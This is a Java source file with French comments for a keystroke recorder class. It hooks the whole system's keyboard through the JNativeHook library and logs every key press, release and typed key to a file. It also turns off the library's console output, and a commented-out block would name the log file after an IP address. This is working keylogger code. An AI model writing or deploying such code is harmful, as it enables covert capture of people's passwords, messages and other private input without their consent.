package main;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 * Enregistre tout les frappes de clavier.
 */
public class EnregistreurDeFrappes implements NativeKeyListener {

	Write text;
	Logger logger;

	/**
	 * Constructeur d'EnregistreurDeFrappes.
	 * 
	 * @param endroit Endroit d'enregistrement du fichier contenant les frappes.
	 * @param nom Nom du fichier contenant les frappes.
	 */
	public EnregistreurDeFrappes(String endroit, String nom) {

		/* Quand n est l'addresse IP, pour être le nom du fichier
		 * 
		 * for (int i = 0; i < n.length(); i++) {
		 *	if (n.charAt(i) == '/') {
		 *		String replace = n.substring(0, i - 1);
		 *		replace += "_";
		 *		replace += n.substring(i + 1, n.length());
		 *		System.out.println(replace);
		 *		n = replace;
		 *	}
		 *}
		*/
		
		text = new Write(endroit + nom);

		// Pour avoir aucune sortie dans la console, sauf pour le commencement
		logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.OFF);
		logger.setUseParentHandlers(false);
	}
	
	/* 
	 * Appelé lorsque l'utilisateur a pessé une touche.
	 * 
	 * (non-Javadoc)
	 * @see org.jnativehook.keyboard.NativeKeyListener#nativeKeyPressed(org.jnativehook.keyboard.NativeKeyEvent)
	 */
	public void nativeKeyPressed(NativeKeyEvent e) {
		text.write("Pessé: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
	}

	/* 
	 * Appelé lorsque l'utilisateur a relâché une touche.
	 * 
	 * (non-Javadoc)
	 * @see org.jnativehook.keyboard.NativeKeyListener#nativeKeyReleased(org.jnativehook.keyboard.NativeKeyEvent)
	 */
	public void nativeKeyReleased(NativeKeyEvent e) {
		text.write("Relâché: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
	}

	/* 
	 * Appelé lorsque l'utilisateur a tapé une touche.
	 * 
	 * (non-Javadoc)
	 * @see org.jnativehook.keyboard.NativeKeyListener#nativeKeyTyped(org.jnativehook.keyboard.NativeKeyEvent)
	 */
	public void nativeKeyTyped(NativeKeyEvent e) {
		text.write("Tapé: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
	}

}